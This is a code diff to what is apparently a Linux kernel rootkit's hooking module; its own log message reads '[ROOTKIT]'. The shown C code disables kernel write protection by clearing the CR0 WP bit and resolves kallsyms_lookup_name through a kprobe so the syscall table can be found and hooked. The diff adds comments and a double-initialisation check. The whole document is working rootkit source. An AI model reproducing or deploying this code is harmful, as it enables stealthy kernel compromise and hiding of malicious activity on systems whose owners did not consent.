@@ -7,14 +7,22 @@
 #include <linux/printk.h>
 
 
-static kallsyms_t lookup_name;
-static uint64_t *p_syscall_table;
+static kallsyms_t lookup_name    = NULL; // Function pointer for `kallsyms_lookup_name()`.
+static uint64_t *p_syscall_table = NULL; // Pointer to the syscall table.
 
+/**
+ * Writes the given value to the CR0 register.
+ */
 static inline void cr0_write(unsigned long val)
 {
     asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
 }
 
+/**
+ * Unprotects memory by clearing the WP (write-protected) bit of the CR0 register.
+ *
+ * @return The original value of the CR0 register
+ */
 static inline unsigned long unprotect_memory(void)
 {
     unsigned long ul_orig_cr0;
@@ -26,6 +34,11 @@ static inline unsigned long unprotect_memory(void)
     return ul_orig_cr0;
 }
 
+/**
+ * Restores the original value of the CR0 register.
+ *
+ * @param ul_orig_cr0 The original value of the CR0 register
+ */
 static inline void protect_memory(unsigned long ul_orig_cr0)
 {
     cr0_write(ul_orig_cr0);
@@ -39,6 +52,11 @@ int init_hooking(void)
     struct kprobe probe = {
         .symbol_name = KALLSYMS_NAME,
     };
+
+    if (lookup_name != NULL) {
+        pr_err("[ROOTKIT] Hooking module already initialized.");
+        return -EALREADY;
+    }
 
     i_err = register_kprobe(&probe);
     if (i_err) {
